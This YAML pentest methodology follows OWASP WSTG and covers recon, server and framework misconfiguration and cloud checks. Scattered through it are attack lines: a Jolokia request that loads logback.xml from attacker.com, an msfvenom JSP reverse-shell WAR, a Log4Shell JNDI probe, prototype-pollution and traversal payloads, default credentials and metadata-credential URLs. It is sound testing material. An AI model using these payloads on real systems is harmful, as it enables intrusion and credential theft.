name: "Web Application Testing"
version: "2.1.0"
author: "HackMind"
tier: asset
description: >
  Question-driven web application penetration testing methodology, aligned to the
  OWASP Web Security Testing Guide (WSTG v4.2). Rather than a flat checklist, the
  tree asks what the target actually exposes — auth mechanism, input sinks, file
  upload, server-side fetch, API style, tech stack — and spawns only the relevant
  checks. Answer the profiling questions first; the methodology narrows itself to
  what is in scope.

nodes:
  # =========================================================================
  # ORIENTATION
  # =========================================================================
  - id: how_to
    type: info
    title: "How to use this methodology"
    content: |
      This template is question-driven. Work top-to-bottom through the WSTG
      phases. Each phase opens with profiling questions ("Does the app parse XML?",
      "What auth mechanism is used?") — answering them spawns the specific checks
      for that surface and hides everything that does not apply.

      Suggested order of work:
      1. Information Gathering (WSTG-INFO) — map the target first.
      2. Configuration & Deployment (WSTG-CONF) — pin down the tech stack via the
         web-server / backend / cloud / CMS questions; tech-specific checks appear.
      3. Identity, Authentication, Authorization, Session — the access-control core.
      4. Input Validation (WSTG-INPV) — answer the input-sink questions; this is
         where most high-impact bugs live.
      5. Error handling, Crypto, Business Logic, Client-side, API.
      6. Bug Bounty Findings — cross-cutting high-signal checks.

      Re-answering a question restores any previously hidden branch with its notes
      and status intact, so it is safe to revise scope as you learn more.

  # =========================================================================
  # WSTG-INFO — INFORMATION GATHERING
  # =========================================================================
  - id: wstg_info
    type: info
    title: "Information Gathering (WSTG-INFO)"
    content: |
      Reconnaissance to map this web asset's attack surface: subdomains, content,
      JavaScript, and exposed cloud storage. Network-level port/service scanning is
      not an asset-level task for a single web target — handle it in the
      engagement-tier template (Internal Pentest / Red Team).
    children:
      - id: recon_scope
        type: checklist
        title: "Define scope and collect seed assets"
        content: |
          Before anything else, clearly define what is in scope.
          - Read the program policy / rules of engagement
          - List all in-scope domains, subdomains, IPs, and ASNs
          - Note any explicitly out-of-scope assets (third-party, CDNs, etc.)
          - Record the target organisation name and known ASNs:
            whois <domain> | grep -i "org\|asn"
            amass intel -org "Target Corp"

      - id: recon_subdomain
        type: checklist
        title: "Subdomain Enumeration"
        content: |
          Passive (no direct contact):
          - crt.sh / cert.sh: https://crt.sh/?q=%25.target.com
          - subfinder -d target.com -all -recursive
          - amass enum -passive -d target.com
          - assetfinder --subs-only target.com
          - GitHub, Shodan, VirusTotal, SecurityTrails, Chaos (chaos.projectdiscovery.io)

          Active (DNS brute-force):
          - puredns brute all.txt target.com -r resolvers.txt
          - dnsx -l subdomains.txt -a -cname -resp

          Post-enumeration:
          - httpx -l subs.txt -title -status-code -tech-detect -ports 80,443,8080,8443
          - Check for CNAME pointing to unclaimed services (subdomain takeover)
          - Look for dev/staging/test subdomains with weaker controls

      - id: recon_google_dorks
        type: checklist
        title: "Google dorking and OSINT"
        content: |
          Use Google / Bing / DuckDuckGo with operators:
          - site:target.com filetype:pdf OR filetype:xlsx OR filetype:docx
          - site:target.com inurl:admin OR inurl:login OR inurl:dashboard
          - site:target.com "index of /" OR "directory listing"
          - site:target.com ext:sql OR ext:log OR ext:bak OR ext:env
          - "target.com" "api_key" OR "secret" OR "password" site:github.com
          - intitle:"500 Internal Server Error" site:target.com

          Other OSINT:
          - Shodan: hostname:target.com / org:"Target Corp"
          - Censys: parsed.names: target.com
          - FOFA / ZoomEye / Netlas for additional asset discovery
          - https://leakix.net - data breach search

      - id: recon_github
        type: checklist
        title: "GitHub / GitLab source code reconnaissance"
        content: |
          Search GitHub for leaked credentials and internal information:
          Tools: trufflehog, gitleaks, gitrob, gh-dork

          Manual searches:
          - github.com/search?q="target.com"+password
          - github.com/search?q="target.com"+api_key
          - github.com/search?q="target.com"+secret
          - github.com/search?q=target.com+filename:.env
          - github.com/search?q=target.com+filename:config.yml

          If source repo found:
          - trufflehog git <repo_url> --only-verified
          - gitleaks detect --source=<cloned_repo> -v
          - Review commit history for credentials committed and removed
          - Look for internal hostnames, endpoint paths, JWT secrets

      - id: recon_wayback
        type: checklist
        title: "Historical URL and parameter analysis"
        content: |
          Mine archived versions for old endpoints, parameters, and JS:
          - waybackurls target.com | tee wayback.txt
          - gau target.com --mc 200 | tee gau.txt
          - cat wayback.txt gau.txt | unfurl paths | sort -u

          Look for:
          - Old admin or debug endpoints still accessible
          - Parameters that no longer appear in the current UI
          - Old API versions (v1, v2) still alive
          - Previously exposed files (backups, configs)

          katana -u https://target.com -depth 5 -jc -kf all -d 5 -o katana.txt

      - id: recon_tech_fingerprint
        type: checklist
        title: "Technology Fingerprinting"
        content: |
          Identify the full tech stack:
          - whatweb -a 3 https://target.com
          - Wappalyzer browser extension
          - httpx -u https://target.com -tech-detect -title -status-code

          HTTP headers to inspect:
          - Server: nginx/1.18 -> version disclosure
          - X-Powered-By: PHP/7.4.3 -> exact version
          - X-Generator / X-Drupal-Cache -> CMS disclosure
          - Via / X-Cache / CF-Cache-Status -> CDN/proxy detection
          - Set-Cookie name patterns: PHPSESSID, JSESSIONID, ASP.NET_SessionId

          Identify WAF:
          - wafw00f https://target.com
          - nmap --script http-waf-detect -p 443 target.com
          - Look for Cloudflare (CF-RAY), Akamai, Imperva, AWS WAF response patterns

          Use the answers here to drive the WSTG-CONF web-server / backend / CMS
          questions below.

      - id: recon_content_discovery
        type: checklist
        title: "Content & directory discovery"
        content: |
          Enumerate paths, files, and hidden endpoints:
          - ffuf -u https://target.com/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -mc 200,201,204,301,302,403 -o ffuf.json
          - feroxbuster -u https://target.com -w /opt/SecLists/Discovery/Web-Content/common.txt --depth 3 --auto-tune

          High-value targets:
          - /.git/HEAD, /.git/config, /.svn/entries
          - /.env, /.env.local, /.env.production
          - /robots.txt, /sitemap.xml, /crossdomain.xml, /clientaccesspolicy.xml
          - /.well-known/security.txt
          - /backup/, /old/, /temp/, /test/, /dev/
          - /phpinfo.php, /info.php, /test.php
          - /server-status, /server-info (Apache)
          - /actuator, /actuator/env, /actuator/heapdump (Spring Boot)
          - /api, /api/v1, /api/v2, /swagger-ui, /openapi.json, /graphql

          File extension bruteforce on discovered paths:
          ffuf -u https://target.com/indexFUZZ -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt

      - id: recon_js_analysis
        type: checklist
        title: "JavaScript and API endpoint analysis"
        content: |
          Extract all JS files and analyse them:
          - katana / gau / waybackurls -> collect all .js URLs
          - curl each JS file, grep for API endpoints:
            grep -oP '(https?://[^\s"'"'"']+|/api/[^\s"'"'"']+)' bundle.js

          Tools:
          - LinkFinder: python3 linkfinder.py -i https://target.com -d
          - SecretFinder: python3 SecretFinder.py -i app.min.js -o cli
          - trufflehog filesystem --directory ./js_files

          Look for:
          - API keys, tokens, credentials (grep for: apiKey, secret, password, token, key:, authorization:)
          - Internal hostnames / staging URLs
          - Hidden admin endpoints or feature flags
          - Source map files (*.js.map) — may expose original source
          - GraphQL schema introspection hints

      - id: recon_cloud_assets
        type: checklist
        title: "Cloud asset discovery"
        content: |
          Find misconfigured cloud storage and services:

          S3 bucket enumeration:
          - s3scanner scan --buckets-file buckets.txt
          - Guess common bucket names: target-com-assets, target-backup, target-dev
          - awscli: aws s3 ls s3://<bucket-name> --no-sign-request

          Azure Blob / GCP Storage:
          - GCPBucketBrute: python3 GCPBucketBrute.py --keyword target
          - https://target.blob.core.windows.net/<container>?restype=container&comp=list

          Check DNS:
          - Any CNAME to *.s3.amazonaws.com, *.blob.core.windows.net, *.storage.googleapis.com
          - nslookup subdomains for cloud indicators

          Firebase / Amplify:
          - https://target-default-rtdb.firebaseio.com/.json (unauthenticated read)
          - Check for exposed Firebase rules

  # =========================================================================
  # WSTG-CONF — CONFIGURATION & DEPLOYMENT MANAGEMENT
  # =========================================================================
  - id: wstg_conf
    type: info
    title: "Configuration & Deployment Management (WSTG-CONF)"
    content: |
      Test the platform configuration, hardening, security headers, and exposed
      infrastructure. Use the web-server / backend / cloud / CMS questions to load
      technology-specific checks based on what fingerprinting in WSTG-INFO revealed.
    children:
      - id: headers_enumerate
        type: checklist
        title: "Enumerate response headers (WSTG-CONF-07)"
        content: |
          Read and document all response headers — always useful for understanding the app's defence posture:
          curl -s -D - https://target.com -o /dev/null
          Or use securityheaders.com / Mozilla Observatory for a quick visual summary.

          Record which of these are present and note their exact values:
          - Strict-Transport-Security
          - Content-Security-Policy
          - X-Frame-Options
          - X-Content-Type-Options
          - Referrer-Policy
          - Permissions-Policy
          - Cache-Control on sensitive pages
          - Server / X-Powered-By (look for version disclosure here)

      - id: headers_check
        type: checklist
        title: "Verify security header configuration (WSTG-CONF-07)"
        scope_tags: [missing_headers]
        content: |
          For each header found above, verify it is present and correctly configured:
          - Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
          - Content-Security-Policy: see CSP analysis node under Client-side Testing
          - X-Frame-Options: DENY or SAMEORIGIN (also check CSP frame-ancestors)
          - X-Content-Type-Options: nosniff
          - Referrer-Policy: no-referrer or strict-origin-when-cross-origin
          - Permissions-Policy: restrict camera, microphone, geolocation as appropriate
          - Cache-Control: no-store on pages containing sensitive user data

      - id: misconfig_debug
        type: checklist
        title: "Debug / development features in production (WSTG-CONF-02)"
        content: |
          - Django DEBUG=True: detailed error pages with local variables and settings
          - Spring Boot Actuator: /actuator/env (environment variables), /actuator/heapdump (heap dump with secrets), /actuator/beans, /actuator/mappings
          - PHP: expose_php=On, phpinfo() pages accessible
          - Node.js: --inspect port (9229) accessible
          - Rails: better_errors gem on production
          - Verbose error pages revealing stack traces and file paths
          - /console, /debug, /_debug_toolbar, /profiler endpoints

      - id: misconfig_default
        type: checklist
        title: "Default credentials and configurations (WSTG-CONF-06)"
        content: |
          Check admin interfaces for default credentials:
          - Jenkins: admin/admin at /jenkins or /
          - Grafana: admin/admin
          - Kibana / Elasticsearch: no auth by default (older versions)
          - Redis: no auth by default — try redis-cli -h target.com PING
          - MongoDB: no auth by default — try mongosh target.com
          - phpMyAdmin: root/(blank)
          - Tomcat Manager: tomcat/tomcat, admin/admin at /manager/html
          - JBoss: admin/(blank) at /jmx-console
          - RabbitMQ management: guest/guest
          - Hashicorp Vault (dev mode): root token in logs

      - id: misconfig_methods
        type: checklist
        title: "Unnecessary HTTP methods and directory listing (WSTG-CONF-06)"
        content: |
          Check for dangerous HTTP methods:
          - OPTIONS -> check Allow header for PUT, DELETE, TRACE, CONNECT
          - TRACE -> enable XST (Cross-Site Tracing): sends back HttpOnly cookies?
          - PUT -> WebDAV file upload
          curl -X OPTIONS https://target.com -v

          Directory listing:
          - Check if any path returns a directory index (Apache autoindex, nginx autoindex on)
          - Look for /uploads/, /backup/, /files/, /assets/, /static/
          - gobuster dir -u https://target.com -w dirs.txt --discover-backup

      - id: misconfig_sensitive_files
        type: checklist
        title: "Exposed sensitive files and paths (WSTG-CONF-04 / 05)"
        content: |
          High-value sensitive paths:
          - /.git/ -> source code disclosure: wget -r https://target.com/.git/
          - /.svn/, /.hg/, /.bzr/ -> VCS metadata
          - /.env, /.env.local, /.env.production -> credentials
          - /wp-config.php, /config.php, /database.yml, /settings.py
          - /backup.zip, /backup.tar.gz, /site.tar.gz
          - /WEB-INF/web.xml (Java), /META-INF/ (Java)
          - /CHANGELOG, /README, /VERSION -> version disclosure

      - id: vulncomponents_identify
        type: checklist
        title: "Enumerate component versions (WSTG-CONF-01)"
        content: |
          Fingerprint what's running so you can cross-reference against CVE databases:
          - HTTP headers: Server:, X-Powered-By:, X-Generator:
          - HTML source: meta generator tags, comment blocks, JS bundle filenames (jquery-3.2.1.min.js)
          - API error responses: stack traces revealing framework versions
          - /version, /status, /health, /info, /actuator endpoints
          - robots.txt, README, CHANGELOG in root
          - WordPress: /wp-login.php, /wp-content/plugins/, /readme.html
          - Tools: CMSmap, wpscan, droopescan, whatweb

      - id: vulncomponents_check
        type: checklist
        title: "Cross-reference versions against CVE databases (WSTG-CONF-01)"
        content: |
          Tools:
          - retire.js: scan JS files for known vulnerable libraries
          - npm audit / snyk for Node.js (if package.json accessible)
          - OWASP Dependency-Check

          Databases:
          - NVD: https://nvd.nist.gov/vuln/search
          - Exploit-DB: https://www.exploit-db.com/
          - Snyk Advisor: https://snyk.io/advisor/

          High-value targets to check:
          - Apache Struts (RCE history: CVE-2017-5638, CVE-2018-11776)
          - Apache Log4j (Log4Shell CVE-2021-44228)
          - Spring Framework (Spring4Shell CVE-2022-22965)
          - jQuery < 3.5.0 (XSS via $.parseHTML)
          - OpenSSL (Heartbleed CVE-2014-0160 — historical but still found)
          - libssl / TLS libraries (DROWN, POODLE)

      - id: vulncomponents_disclosure
        type: checklist
        title: "Check for unnecessary version disclosure (WSTG-CONF-01)"
        scope_tags: [version_disclosure]
        content: |
          Report version strings that are exposed with no operational need
          (a common informational/best-practice finding, often excluded by bug bounty programmes):
          - Server: header revealing OS and web server version (e.g. Apache/2.4.1 Ubuntu)
          - X-Powered-By: revealing framework (e.g. PHP/7.4.3, ASP.NET MVC 5.2)
          - X-Generator: revealing CMS version
          - Stack traces in error pages revealing library versions
          - /version or /status endpoints returning detailed build info
          Hardening: suppress or genericise these headers in server config.

      # ---- Tech stack: web / reverse-proxy server -------------------------
      - id: q_webserver
        type: question
        title: "What is the primary web / reverse-proxy server?"
        options:
          - label: "Nginx"
            key: "nginx"
            children:
              - id: nginx_misconfig
                type: checklist
                title: "Nginx security misconfiguration checks"
                content: |
                  Alias path traversal (alias LFI):
                  If config has: location /files/ { alias /data/; }
                  Try: GET /files../etc/passwd -> may resolve to /data/../etc/passwd

                  Common Nginx misconfigs:
                  - autoindex on -> directory listing
                  - server_tokens on -> version disclosure (check Server: header)
                  - add_header not inheriting in nested blocks (common CSP bypass)
                  - Misconfigured proxy_pass: trailing slash differences
                    location /api { proxy_pass http://backend; } vs
                    location /api { proxy_pass http://backend/; }
                  - off-by-slash SSRF: /api../internal
                  - try_files directive bypassing access controls

                  Check: nginx -T for config (if you have access in pentest)
                  Nuclei: nuclei -t nginx/ -u https://target.com
          - label: "Apache"
            key: "apache"
            children:
              - id: apache_misconfig
                type: checklist
                title: "Apache security misconfiguration checks"
                content: |
                  - mod_status at /server-status — internal server stats
                  - mod_info at /server-info — module configuration
                  - Trace enabled: curl -X TRACE https://target.com (XST)
                  - .htaccess exposure: GET /.htaccess — should 403 / 404
                  - Directory listing: Options +Indexes in .htaccess
                  - ETags leaking inode numbers (historical, less relevant now)
                  - Apache version in Server: header
                  - WebDAV enabled (check OPTIONS: PROPFIND, PUT methods)
                  - mod_proxy open proxy: CONNECT method to internal hosts
          - label: "IIS"
            key: "iis"
            children:
              - id: iis_misconfig
                type: checklist
                title: "IIS security misconfiguration checks"
                content: |
                  - WebDAV enabled: PROPFIND, PUT, MKCOL methods via OPTIONS
                  - IIS version disclosure in Server: header
                  - ASP.NET trace.axd: /trace.axd -> request details including session tokens
                  - Elmah.axd: /elmah.axd -> error log with sensitive data
                  - WebResource.axd / ScriptResource.axd (if misconfigured)
                  - *.config handler bypass: IIS sometimes misconfigured to serve web.config
                  - Short filename (8.3) enumeration: GET /aspx~1/ (legacy, Windows)
                  - IIS PUT method allowed (can upload files in WebDAV)
                  - ViewState without MAC validation (see deserialization section)
          - label: "Tomcat / Jetty (Java servlet container)"
            key: "tomcat"
            children:
              - id: tomcat_misconfig
                type: checklist
                title: "Tomcat / Jetty security checks"
                content: |
                  Manager / admin apps:
                  - /manager/html, /manager/status, /host-manager/html
                  - Default creds: tomcat/tomcat, admin/admin, tomcat/s3cret
                  - If Manager reachable + creds: deploy a WAR webshell
                    (msfvenom -p java/jsp_shell_reverse_tcp LHOST=.. LPORT=.. -f war)

                  Ghostcat (CVE-2020-1938) — AJP connector on :8009:
                  - Read arbitrary files under webapps (e.g. WEB-INF/web.xml) -> creds/config
                  - nmap -p 8009 --script ajp-* or ajpShooter.py

                  Other:
                  - /examples/ servlets & JSPs (SessionExample leaks cookies)
                  - Version + stack traces in default 404/500 error pages
                  - JSP source disclosure via path tricks (;.jsp, %2e, trailing dots)
                  - Jetty: CVE-2021-28164/28165 (WEB-INF disclosure / DoS), default /test webapp
          - label: "Caddy"
            key: "caddy"
            children:
              - id: caddy_misconfig
                type: checklist
                title: "Caddy security checks"
                content: |
                  - Admin API (default localhost:2019) — if exposed or SSRF-reachable, full live
                    reconfig: GET /config/, POST /load -> reroute traffic / add reverse_proxy
                  - reverse_proxy header handling: does it forward/trust X-Forwarded-* from the client?
                  - Path matcher ordering bugs can expose routes intended to be protected
                  - file_server with browse enabled -> directory listing
                  - On-demand TLS abuse: certs issued for unintended/attacker hostnames
                  - Check Server header (often suppressed) and version-specific CVEs
          - label: "LiteSpeed / OpenLiteSpeed"
            key: "litespeed"
            children:
              - id: litespeed_misconfig
                type: checklist
                title: "LiteSpeed / OpenLiteSpeed security checks"
                content: |
                  - WebAdmin console on :7080 (OpenLiteSpeed) — default admin / 123456
                  - CVE-2022-0073 / CVE-2018-20056: OpenLiteSpeed dashboard RCE via PHP env vars
                  - Server: LiteSpeed header -> version disclosure
                  - LiteSpeed Cache (WordPress plugin) CVEs -> cache poisoning / privesc
                  - Check for exposed /admin_php/ and config backups
          - label: "Reverse proxy / API gateway (Traefik / HAProxy / Envoy / Kong)"
            key: "reverse_proxy"
            children:
              - id: revproxy_misconfig
                type: checklist
                title: "Reverse proxy / gateway security checks"
                content: |
                  - Traefik dashboard exposed (api.insecure=true) on :8080 -> /dashboard/, /api/rawdata
                    leaks all routers, services, and backend URLs
                  - Kong Admin API (:8001) exposed -> add routes/plugins, dump credentials
                  - Header trust: are X-Forwarded-For / X-Forwarded-Host / X-Real-IP accepted from
                    the client and used for auth or routing? (spoof to reach internal vhosts)
                  - Path normalization mismatch between proxy and backend -> ACL bypass
                    (/admin vs /%2e/admin vs //admin) and request smuggling (see Bug Bounty)
                  - Trailing-slash / merge_slashes differences (Envoy) bypassing route ACLs
                  - SSRF to internal services if the gateway proxies user-supplied upstreams
          - label: "Other / Unknown"
            key: "other"
            children:
              - id: webserver_generic
                type: checklist
                title: "Generic web server checks"
                content: |
                  - Identify server via Server: header and error pages
                  - Search NVD for the identified version
                  - Run nuclei -t exposures/ -t misconfiguration/ against the target
                  - Check for default error pages revealing the server identity

      # ---- Tech stack: backend framework ----------------------------------
      - id: q_backend
        type: question
        title: "What is the primary backend framework / language?"
        options:
          - label: "Spring Boot (Java)"
            key: "springboot"
            children:
              - id: springboot_actuator
                type: checklist
                title: "Spring Boot Actuator exposure"
                content: |
                  Enumerate actuator endpoints:
                  /actuator -> lists all enabled endpoints
                  /actuator/env -> ALL environment variables (includes passwords, keys)
                  /actuator/heapdump -> download full JVM heap (extract creds with jmap/strings)
                  /actuator/threaddump -> thread state
                  /actuator/logfile -> application log
                  /actuator/beans -> all Spring beans
                  /actuator/mappings -> all URL routes
                  /actuator/httptrace -> last 100 HTTP requests
                  /actuator/jolokia -> JMX over HTTP -> potential RCE
                  /actuator/gateway/routes -> Spring Cloud Gateway routes

                  Jolokia RCE:
                  POST /actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker.com!/logback.xml
              - id: springboot_misc
                type: checklist
                title: "Spring Boot / Spring Security misconfiguration"
                content: |
                  - H2 console exposed: /h2-console (dev database, often unauthenticated)
                  - Spring Security debug filter leaking info
                  - CSRF disabled globally (@EnableWebSecurity with csrf().disable())
                  - Spring EL injection in SpEL expressions (SSTI section)
                  - Whitelabel error page revealing stack traces
          - label: "Node.js / Express"
            key: "nodejs"
            children:
              - id: nodejs_misc
                type: checklist
                title: "Node.js / Express misconfiguration"
                content: |
                  - Prototype pollution: inject __proto__: {"isAdmin": true} in JSON body or query params
                    Test: /?__proto__[isAdmin]=true or {"__proto__": {"admin": true}}
                  - Path traversal via static file serving (express.static misconfiguration)
                  - Debug port exposed: node --inspect (port 9229) -> RCE via WebSocket
                  - npm packages: check package.json for outdated or vulnerable deps
                  - process.env values leaking via error messages or /env endpoints
                  - Unhandled promise rejections revealing stack traces
                  - Morgan / Winston logging sensitive data
                  - Template injection: Pug, Handlebars, EJS, Mustache if user input rendered
          - label: "PHP"
            key: "php"
            children:
              - id: php_misc
                type: checklist
                title: "PHP misconfiguration and specific attacks"
                content: |
                  - phpinfo(): /phpinfo.php, /info.php, /test.php
                    Reveals: PHP version, loaded modules, environment variables, upload paths
                  - expose_php = On -> version in X-Powered-By header
                  - allow_url_include = On -> remote file inclusion (RFI)
                  - register_globals = On (legacy) -> variable injection
                  - PHP type juggling: "0e123456" == "0e654321" -> true (loose comparison)
                    Test in login: password="0e123456" if MD5 hash starts with 0e
                  - PHP object injection (unserialize with user data — see deserialization)
                  - Dangerous functions: eval, exec, system, passthru, shell_exec, popen
                  - LFI via PHP wrappers: php://filter, php://input, data://
                  - Session file LFI: /var/lib/php/sessions/sess_<PHPSESSID>
          - label: "Django / Flask (Python)"
            key: "python"
            children:
              - id: python_misc
                type: checklist
                title: "Django / Flask misconfiguration"
                content: |
                  Django:
                  - DEBUG=True: full stack traces + settings dump at any 404/500
                  - Django admin at /admin/ — default path, default admin:admin
                  - SECRET_KEY exposed (in .env, GitHub, error pages) -> forge session cookies
                  - Django debug toolbar exposed (/djdt/)
                  - Misconfigured ALLOWED_HOSTS: * allows host header injection
                  - SQL injection via raw() or extra() queries with unsanitised input

                  Flask:
                  - DEBUG=True + Werkzeug debugger: interactive Python console at /console
                    (PIN bypass technique if PIN known/predictable)
                  - SECRET_KEY hardcoded -> forge Flask session cookies (flask-unsign)
                  - SSTI via Jinja2 if templates render user input
                  - Python pickle deserialization in sessions (if ItsDangerous not used)
          - label: "ASP.NET Core (.NET)"
            key: "dotnet"
            children:
              - id: dotnet_misc
                type: checklist
                title: "ASP.NET / .NET Core misconfiguration"
                content: |
                  - Elmah.axd error log at /elmah.axd (old ASP.NET)
                  - trace.axd at /trace.axd — request/response traces
                  - ViewState MAC disabled -> forge ViewState for deserialization RCE
                    Check: __VIEWSTATEGENERATOR in page source, test with YSoSerial.Net
                  - .NET Core: appsettings.json / secrets.json accessible
                  - Detailed errors in production (customErrors mode="Off")
                  - Swagger / Swashbuckle left enabled in production
          - label: "Ruby on Rails"
            key: "rails"
            children:
              - id: rails_misc
                type: checklist
                title: "Ruby on Rails misconfiguration"
                content: |
                  - Rails debug page (better_errors) in production: detailed variable dump
                  - Secret_key_base exposed -> forge signed cookies (rails-cookie-forger)
                  - Mass assignment with permit! or without strong parameters (attr_accessible legacy)
                  - YAML deserialization: older Rails versions vulnerable to Psych YAML exploits
                  - SQL injection via raw string in ActiveRecord: where("name = '#{params[:name]}'")
                  - Path traversal via send_file with user-controlled path
                  - /rails/info/properties in development -> environment info
          - label: "Go (Gin / Echo / Fiber / net/http)"
            key: "golang"
            children:
              - id: golang_misc
                type: checklist
                title: "Go backend checks"
                content: |
                  - pprof exposed: /debug/pprof/, /debug/pprof/heap (heap may contain secrets)
                  - expvar at /debug/vars leaking config/metrics
                  - SSTI / XSS: text/template used for HTML output has NO auto-escaping;
                    also user-controlled template strings in html/template
                  - Path traversal via http.FileServer / http.Dir with uncleaned user paths
                  - Hand-rolled authz: Go apps rarely use a framework for access control
                    -> test IDOR / missing function-level checks aggressively
                  - Mass assignment via json.Unmarshal into shared structs (extra JSON keys)
                  - Open redirect via http.Redirect with user-controlled Location
                  - Race conditions on shared state (goroutines) — TOCTOU on balance/quota
          - label: "Java EE / Struts / JSF / Servlets (non-Spring)"
            key: "javaee"
            children:
              - id: javaee_misc
                type: checklist
                title: "Java EE / Struts / JSF checks"
                content: |
                  Apache Struts (OGNL injection -> RCE):
                  - CVE-2017-5638 (Content-Type header), S2-045/046, CVE-2018-11776 (namespace)
                  - %{(#_='multipart/form-data')...} probes; nuclei -t struts/

                  JSF (JavaServer Faces):
                  - ViewState deserialization if javax.faces.ViewState is not encrypted/MAC'd
                  - Path traversal via faces resources: /faces/javax.faces.resource/..%2f

                  General Java:
                  - Log4Shell (CVE-2021-44228): ${jndi:ldap://x} in ANY logged input (UA, headers, fields)
                  - Expression Language injection (#{...}) in JSP/EL
                  - .jsp source disclosure; /WEB-INF/ and /META-INF/ exposure
                  - Java serialized objects in cookies/params (rO0AB...) -> ysoserial gadget chains
          - label: "Laravel (PHP framework)"
            key: "laravel"
            children:
              - id: laravel_misc
                type: checklist
                title: "Laravel security checks"
                content: |
                  - Debug mode (APP_DEBUG=true): Ignition error page leaks env + stack traces
                    -> CVE-2021-3129 RCE via /_ignition/execute-solution (Laravel < 8.4.2 + Ignition)
                  - .env exposure: /.env, /.env.bak -> APP_KEY, DB creds, mail/AWS keys
                  - APP_KEY leak -> forge/decrypt signed cookies; deserialization RCE through the
                    encrypted session/cookie (CVE-2018-15133)
                  - Telescope exposed in prod: /telescope (requests, queries, models, mail)
                  - Debugbar: /_debugbar/open leaking queries
                  - Mass assignment if $guarded = [] or $fillable too broad
                  - php artisan route:list patterns -> predictable resource routes for IDOR
          - label: "Adobe ColdFusion"
            key: "coldfusion"
            children:
              - id: coldfusion_misc
                type: checklist
                title: "Adobe ColdFusion checks"
                content: |
                  - Admin console: /CFIDE/administrator/index.cfm (IP-restricted? default/blank creds?)
                  - CVE-2023-26360 / CVE-2023-29298: unauth deserialization RCE + access-control bypass
                  - CVE-2010-2861 LFI: /CFIDE/administrator/...?locale=../ (read password.properties)
                  - FCKeditor file upload -> RCE (CVE-2009-2265); CVE-2018-15961 unauth upload RCE
                  - /CFIDE/adminapi/, /CFIDE/componentutils/, /cf_scripts/ exposure
                  - Verbose CFML error pages revealing paths, queries, and source
                  - Runs on the JVM -> Java deserialization applies (see Struts/ysoserial notes)
          - label: "Other / Unknown"
            key: "other_backend"
            children:
              - id: other_backend_generic
                type: checklist
                title: "Generic backend checks"
                content: |
                  - Identify framework via error messages, headers, and file extensions
                  - Search NVD and exploit-db for identified framework version
                  - Run nuclei -t technologies/ for tech-specific checks
                  - Review all error responses for stack trace / version disclosure

      # ---- Tech stack: cloud ----------------------------------------------
      - id: q_cloud
        type: question
        title: "Is the application hosted on a cloud platform?"
        options:
          - label: "AWS"
            key: "aws"
            children:
              - id: aws_checks
                type: checklist
                title: "AWS-specific security checks"
                content: |
                  S3 bucket access:
                  - aws s3 ls s3://target-bucket --no-sign-request
                  - aws s3 cp s3://target-bucket/sensitive.txt . --no-sign-request
                  - Check: s3://target-name-backup, s3://target-dev, s3://target-assets
                  - S3 static website: http://target.s3-website-us-east-1.amazonaws.com

                  SSRF -> IMDS (see Input Validation / SSRF section):
                  - http://169.254.169.254/latest/meta-data/iam/security-credentials/
                  - If credentials obtained: configure aws-cli and enumerate permissions

                  API Gateway:
                  - Check for unauthenticated API Gateway endpoints
                  - Test for missing authorization at specific HTTP methods
                  - Check CORS on API Gateway: wildcard origin + credentials

                  Common misconfigs:
                  - Public ECR repositories with sensitive images
                  - Publicly readable DynamoDB (via lambda or API)
                  - Cognito Identity Pool with unauthenticated access enabled
                  - Lambda function URLs without auth
          - label: "Azure"
            key: "azure"
            children:
              - id: azure_checks
                type: checklist
                title: "Azure-specific security checks"
                content: |
                  - Azure Blob Storage public access:
                    https://account.blob.core.windows.net/container?restype=container&comp=list
                  - Azure Table Storage: https://account.table.core.windows.net/tableName
                  - App Service: check *.azurewebsites.net for subdomain takeover
                  - Azure AD: check if tenant allows unauthenticated resource enumeration
                  - IMDS: http://169.254.169.254/metadata/instance?api-version=2021-02-01
                    (requires Metadata: true header)
                  - App Service metadata: https://target.scm.azurewebsites.net (Kudu)
          - label: "GCP"
            key: "gcp"
            children:
              - id: gcp_checks
                type: checklist
                title: "GCP-specific security checks"
                content: |
                  - GCS public bucket: https://storage.googleapis.com/target-bucket/
                  - Firebase RTDB: https://target-default-rtdb.firebaseio.com/.json
                  - Firebase Storage: https://firebasestorage.googleapis.com/v0/b/target.appspot.com/o
                  - GCP metadata: http://metadata.google.internal/computeMetadata/v1/
                    (requires Metadata-Flavor: Google header)
                  - Service account key files: leaked service account JSON keys on GitHub
                  - App Engine default service account with project editor permissions
          - label: "Cloudflare"
            key: "cloudflare"
            children:
              - id: cloudflare_checks
                type: checklist
                title: "Cloudflare-specific checks"
                content: |
                  - Origin IP disclosure (to bypass WAF/DDoS): historical DNS (SecurityTrails, crt.sh),
                    SSRF, email headers, /cdn-cgi/trace, subdomains pointing direct-to-origin
                  - Once origin IP found: connect directly with Host: target.com to bypass the WAF
                  - Cloudflare Access: is EVERY origin route actually behind Access, or can you reach
                    the origin directly? Check CF-Access-Jwt-Assertion validation on the origin
                  - Workers: SSRF/subrequest abuse, secrets baked into the Worker, open KV/R2 bindings
                  - R2 buckets: public bucket / predictable object URLs
                  - /cdn-cgi/ endpoints; cache rules -> web cache poisoning / deception
                  - Firewall bypass via X-Forwarded-For if the origin trusts it
          - label: "DigitalOcean"
            key: "digitalocean"
            children:
              - id: digitalocean_checks
                type: checklist
                title: "DigitalOcean-specific checks"
                content: |
                  - Spaces (S3-compatible) public buckets:
                    https://<space>.<region>.digitaloceanspaces.com (test anon list/read)
                    Guess names: target-assets, target-backup, target-static
                  - Droplet metadata via SSRF: http://169.254.169.254/metadata/v1/
                    -> /metadata/v1/user-data (cloud-init secrets), /metadata/v1.json
                  - App Platform: exposed env vars and build logs
                  - Managed DB endpoints accidentally public (check trusted-source firewall)
          - label: "Oracle Cloud (OCI)"
            key: "oraclecloud"
            children:
              - id: oraclecloud_checks
                type: checklist
                title: "Oracle Cloud (OCI)-specific checks"
                content: |
                  - Object Storage public buckets:
                    https://objectstorage.<region>.oraclecloud.com/n/<namespace>/b/<bucket>/o/
                  - Leaked Pre-Authenticated Request (PAR) URLs grant direct object access
                  - Instance metadata via SSRF: http://169.254.169.254/opc/v2/instance/
                    (v2 requires header: Authorization: Bearer Oracle)
                  - Instance-principal creds via metadata -> OCI CLI enumeration
